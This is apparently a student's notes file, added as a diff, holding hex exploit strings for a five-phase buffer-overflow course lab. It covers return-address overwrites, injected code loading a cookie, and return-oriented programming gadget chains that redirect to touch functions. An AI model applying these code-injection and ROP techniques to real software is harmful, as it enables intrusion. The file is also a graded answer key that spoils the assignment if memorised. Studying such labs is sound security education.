@@ -1,0 +1,107 @@
+text file to comment on and note my answers because the comments in my actual answer files didn't work
+
+phase 1:
+
+buffer 0x38 = 56 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+address of touch1 function, backwards
+2e 15 40 00 00 00 00 00
+
+
+phase 2:
+
+mov command and cookie value
+48 c7 c7 c5 85 f7 3e c3
+buffer of only 48 bytes to account for 8 above
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+rsp address minus buffer val
+98 A1 64 55 00 00 00 00
+touch2 address
+5c 15 40 00 00 00 00 00
+
+
+phase 3:
+
+mov command and rsp val plus 0x10 (because overflow of 16 bytes to store rsp-buffer and touch3 address, and 16 in hex is 0x10)
+48 c7 c7 E0 A1 64 55 c3
+buffer of 48 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+rsp val minus buffer
+98 A1 64 55 00 00 00 00
+touch3 address
+73 16 40 00 00 00 00 00
+cookie val converted from ascii to hex
+33 65 66 37 38 35 63 35 00
+
+
+phase 4:
+
+buffer of 56 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+gadget1- found sequence of 58 90 c3 address and added offset
+pop %rax
+18 17 40 00 00 00 00 00
+cookie value
+c5 85 f7 3e 00 00 00 00
+gadget2- found sequence of 48 89 c7 c3 address and added offset
+mov %rax, %rdi
+45 17 40 00 00 00 00 00
+touch2 address
+5c 15 40 00 00 00 00 00
+
+
+phase 5:
+
+buffer of 56 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+gadget1 0x401798 | mov %rsp, %rax
+98 17 40 00 00 00 00 00
+gadget2 0x401738 | mov %rax, %rdi
+38 17 40 00 00 00 00 00
+gadget3 18 17 40 00 00 00 00 00 | pop %rax
+18 17 40 00 00 00 00 00
+offset 0x48
+first line to cookie string (10 lines so (10-1)*8 as hex = 0x48)
+48 00 00 00 00 00 00 00
+gadget4 0x4017A4 | movl %eax, %edx
+A4 17 40 00 00 00 00 00
+gadget5 0x4017B2 (or 0x401769) | movl %ecx, %edx
+B2 17 40 00 00 00 00 00
+gadget6 0x40178B (or 0x40177E) | movl %edx, %esi
+8B 17 40 00 00 00 00 00
+gadget7 000000000040174f | lea (%rdi, %rsi, 1), %rax
+4f 17 40 00 00 00 00 00
+gadget8 0x401738 (same as 2) | mov %rax, %rdi
+38 17 40 00 00 00 00 00
+touch3 address
+73 16 40 00 00 00 00 00
+cookie string
+33 65 66 37 38 35 63 35 00
